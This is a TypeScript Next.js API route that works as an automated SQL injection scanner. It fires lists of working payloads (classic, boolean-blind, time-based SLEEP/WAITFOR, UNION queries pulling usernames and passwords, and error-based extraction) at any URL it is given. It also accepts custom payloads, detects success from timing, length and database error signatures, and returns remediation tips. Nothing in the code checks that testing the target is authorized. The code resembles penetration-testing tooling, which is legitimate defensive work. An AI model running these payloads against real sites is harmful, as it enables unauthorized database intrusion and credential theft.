import { NextRequest, NextResponse } from 'next/server';

interface SQLInjectionRequest {
  url: string;
  testType: 'comprehensive' | 'basic' | 'boolean' | 'time' | 'union' | 'error';
  parameters?: string;
  customPayload?: string;
}

interface SQLInjectionResult {
  vulnerable: boolean;
  payloadsTested: number;
  successfulPayloads: string[];
  vulnerabilityType: string[];
  riskLevel: 'Low' | 'Medium' | 'High' | 'Critical';
  recommendations: string[];
  detailedResults: {
    payload: string;
    response: string;
    vulnerable: boolean;
    type: string;
  }[];
}

export async function POST(request: NextRequest) {
  try {
    const body: SQLInjectionRequest = await request.json();
    const { url, testType, parameters, customPayload } = body;

    if (!url) {
      return NextResponse.json(
        { error: 'URL is required' },
        { status: 400 }
      );
    }

    // SQL Injection Payloads by Type
    const payloads = {
      basic: [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "\" OR 1=1--",
        "' OR 'a'='a",
        "') OR ('1'='1",
      ],
      boolean: [
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "' AND (SELECT COUNT(*) FROM sysobjects)>0--",
        "' AND SUBSTRING(@@version,1,1)='M'--",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--",
        "' AND (SELECT COUNT(*) FROM dual)=1--",
        "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
      ],
      time: [
        "'; WAITFOR DELAY '00:00:05'--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--",
        "'; SELECT SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND SLEEP(5)--",
        "' OR IF(1=1,SLEEP(5),0)--",
        "' UNION SELECT IF(SUBSTRING(current_user,1,1)='r',SLEEP(5),0)--",
      ],
      union: [
        "' UNION SELECT null,null,null--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT database(),user(),version()--",
        "' UNION SELECT table_name,null,null FROM information_schema.tables--",
        "' UNION SELECT column_name,null,null FROM information_schema.columns--",
        "' UNION SELECT username,password,null FROM users--",
      ],
      error: [
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))-- ",
        "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(database(),0x3a,FLOOR(RAND(0)*2)))-- ",
        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(95),database(),CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(95),FLOOR(RAND()*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)-- ",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
        "' OR EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))-- ",
      ],
    };

    let testPayloads: string[] = [];
    
    if (testType === 'comprehensive') {
      testPayloads = [
        ...payloads.basic,
        ...payloads.boolean,
        ...payloads.time,
        ...payloads.union,
        ...payloads.error,
      ];
    } else {
      testPayloads = payloads[testType] || payloads.basic;
    }

    // Add custom payload if provided
    if (customPayload) {
      testPayloads.push(customPayload);
    }

    // Perform real SQL injection testing
    const results: SQLInjectionResult = await performRealSQLInjectionTest(
      url,
      testPayloads,
      parameters
    );

    return NextResponse.json(results);
  } catch (error) {
    console.error('SQL injection test error:', error);
    return NextResponse.json(
      { error: 'Failed to perform SQL injection test' },
      { status: 500 }
    );
  }
}

async function performRealSQLInjectionTest(
  url: string,
  payloads: string[],
  parameters?: string
): Promise<SQLInjectionResult> {
  const detailedResults = [];
  const baselineResponse = await makeBaselineRequest(url);
  
  for (const payload of payloads) {
    try {
      const testResult = await testSQLPayload(url, payload, parameters, baselineResponse);
      detailedResults.push(testResult);
      
      // Add small delay between requests to avoid overwhelming the target
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      detailedResults.push({
        payload,
        response: `Request failed: ${error}`,
        vulnerable: false,
        type: determinePayloadType(payload),
      });
    }
  }

  const successfulPayloads = detailedResults
    .filter(result => result.vulnerable)
    .map(result => result.payload);

  const vulnerabilityTypes = [...new Set(
    detailedResults
      .filter(result => result.vulnerable)
      .map(result => result.type)
  )];

  const vulnerable = successfulPayloads.length > 0;
  const riskLevel = calculateRiskLevel(successfulPayloads.length, payloads.length);

  const recommendations = generateRecommendations(vulnerable, vulnerabilityTypes);

  return {
    vulnerable,
    payloadsTested: payloads.length,
    successfulPayloads,
    vulnerabilityType: vulnerabilityTypes,
    riskLevel,
    recommendations,
    detailedResults,
  };
}

async function makeBaselineRequest(url: string): Promise<{
  statusCode: number;
  responseTime: number;
  contentLength: number;
  errorSignatures: string[];
}> {
  const startTime = Date.now();
  
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
      signal: AbortSignal.timeout(10000), // 10 second timeout
    });
    
    const responseTime = Date.now() - startTime;
    const responseText = await response.text();
    const contentLength = responseText.length;
    const errorSignatures = extractErrorSignatures(responseText);
    
    return {
      statusCode: response.status,
      responseTime,
      contentLength,
      errorSignatures,
    };
  } catch (error) {
    return {
      statusCode: 0,
      responseTime: Date.now() - startTime,
      contentLength: 0,
      errorSignatures: [],
    };
  }
}

async function testSQLPayload(
  url: string,
  payload: string,
  parameters: string = '',
  baseline: any
): Promise<{
  payload: string;
  response: string;
  vulnerable: boolean;
  type: string;
}> {
  const startTime = Date.now();
  
  // Prepare the test URL with payload
  const testUrl = injectPayload(url, payload, parameters);
  
  try {
    const response = await fetch(testUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      },
      signal: AbortSignal.timeout(15000), // 15 second timeout for time-based payloads
    });
    
    const responseTime = Date.now() - startTime;
    const responseText = await response.text();
    const contentLength = responseText.length;
    const errorSignatures = extractErrorSignatures(responseText);
    
    // Analyze response for SQL injection indicators
    const isVulnerable = analyzeSQLInjectionResponse(
      payload,
      response.status,
      responseText,
      responseTime,
      contentLength,
      baseline
    );
    
    const responsePreview = responseText.length > 500 
      ? responseText.substring(0, 500) + '...' 
      : responseText;
    
    return {
      payload,
      response: `Status: ${response.status}, Time: ${responseTime}ms, Length: ${contentLength}, Response: ${responsePreview}`,
      vulnerable: isVulnerable,
      type: determinePayloadType(payload),
    };
    
  } catch (error) {
    return {
      payload,
      response: `Request failed: ${error}`,
      vulnerable: false,
      type: determinePayloadType(payload),
    };
  }
}

function injectPayload(url: string, payload: string, parameters: string): string {
  try {
    const urlObj = new URL(url);
    
    if (parameters) {
      // Inject into specific parameter
      const params = parameters.split(',');
      params.forEach(param => {
        urlObj.searchParams.set(param.trim(), payload);
      });
    } else {
      // Inject into all existing parameters or add as 'id' parameter
      if (urlObj.searchParams.toString()) {
        urlObj.searchParams.forEach((value, key) => {
          urlObj.searchParams.set(key, payload);
        });
      } else {
        urlObj.searchParams.set('id', payload);
      }
    }
    
    return urlObj.toString();
  } catch (error) {
    // If URL parsing fails, append payload as query parameter
    const separator = url.includes('?') ? '&' : '?';
    return `${url}${separator}id=${encodeURIComponent(payload)}`;
  }
}

function extractErrorSignatures(responseText: string): string[] {
  const signatures: string[] = [];
  const errorPatterns = [
    /you have an error in your sql syntax/i,
    /warning.*mysql/i,
    /valid mysql result/i,
    /mysqlclient\./i,
    /postgresql.*error/i,
    /warning.*pg_/i,
    /valid postgresql result/i,
    /npgsql\./i,
    /driver.*sql server/i,
    /ole db.*sql server/i,
    /(\[sql server\])/i,
    /odbc.*sql server/i,
    /oracle error/i,
    /oracle.*driver/i,
    /warning.*oci_/i,
    /ora-\d{5}/i,
  ];
  
  errorPatterns.forEach(pattern => {
    if (pattern.test(responseText)) {
      signatures.push(pattern.source);
    }
  });
  
  return signatures;
}

function analyzeSQLInjectionResponse(
  payload: string,
  statusCode: number,
  responseText: string,
  responseTime: number,
  contentLength: number,
  baseline: any
): boolean {
  // Time-based detection
  if (payload.includes('SLEEP') || payload.includes('WAITFOR')) {
    return responseTime > (baseline.responseTime + 4000); // 4+ second delay indicates time-based injection
  }
  
  // Error-based detection
  const errorSignatures = extractErrorSignatures(responseText);
  if (errorSignatures.length > baseline.errorSignatures.length) {
    return true;
  }
  
  // Boolean-based detection (significant content length difference)
  if (Math.abs(contentLength - baseline.contentLength) > baseline.contentLength * 0.1) {
    return true;
  }
  
  // Union-based detection (looking for specific patterns in response)
  if (payload.includes('UNION') && responseText.toLowerCase().includes('database')) {
    return true;
  }
  
  // Status code changes
  if (statusCode !== baseline.statusCode && statusCode >= 500) {
    return true;
  }
  
  // Common SQL error patterns
  const sqlErrorPatterns = [
    /syntax error.*near/i,
    /unterminated quoted string/i,
    /unexpected end of sql command/i,
    /division by zero/i,
    /table.*doesn't exist/i,
    /column.*doesn't exist/i,
    /duplicate column name/i,
    /subquery returns more than 1 row/i,
    /data truncated for column/i,
  ];
  
  return sqlErrorPatterns.some(pattern => pattern.test(responseText));
}

function determinePayloadType(payload: string): string {
  if (payload.includes('UNION')) return 'Union-based';
  if (payload.includes('SLEEP') || payload.includes('WAITFOR')) return 'Time-based Blind';
  if (payload.includes('EXTRACTVALUE') || payload.includes('ROW(')) return 'Error-based';
  if (payload.includes('AND') || payload.includes('SUBSTRING')) return 'Boolean-based Blind';
  return 'Classic SQL Injection';
}

function calculateRiskLevel(
  successfulPayloads: number,
  totalPayloads: number
): 'Low' | 'Medium' | 'High' | 'Critical' {
  const successRate = successfulPayloads / totalPayloads;
  
  if (successRate >= 0.5) return 'Critical';
  if (successRate >= 0.3) return 'High';
  if (successRate >= 0.1) return 'Medium';
  if (successfulPayloads > 0) return 'Low';
  return 'Low';
}

function generateRecommendations(
  vulnerable: boolean,
  vulnerabilityTypes: string[]
): string[] {
  if (!vulnerable) {
    return [
      "✅ No SQL injection vulnerabilities detected",
      "Continue regular security testing to maintain security posture",
      "Consider implementing additional input validation layers",
    ];
  }

  const recommendations = [
    "🔒 Use parameterized queries/prepared statements for all database interactions",
    "🛡️ Implement strict input validation and sanitization",
    "🔐 Apply principle of least privilege to database accounts",
    "📊 Enable database query logging and monitoring",
    "🚨 Deploy a Web Application Firewall (WAF) with SQL injection rules",
    "🔍 Conduct regular security code reviews",
    "📋 Implement secure coding guidelines for developers",
  ];

  if (vulnerabilityTypes.includes('Union-based')) {
    recommendations.push("⚠️ Fix UNION-based injection by validating column counts and data types");
  }

  if (vulnerabilityTypes.includes('Time-based Blind')) {
    recommendations.push("⏱️ Implement query timeout limits to prevent time-based attacks");
  }

  if (vulnerabilityTypes.includes('Error-based')) {
    recommendations.push("🚫 Disable detailed database error messages in production");
  }

  return recommendations;
}
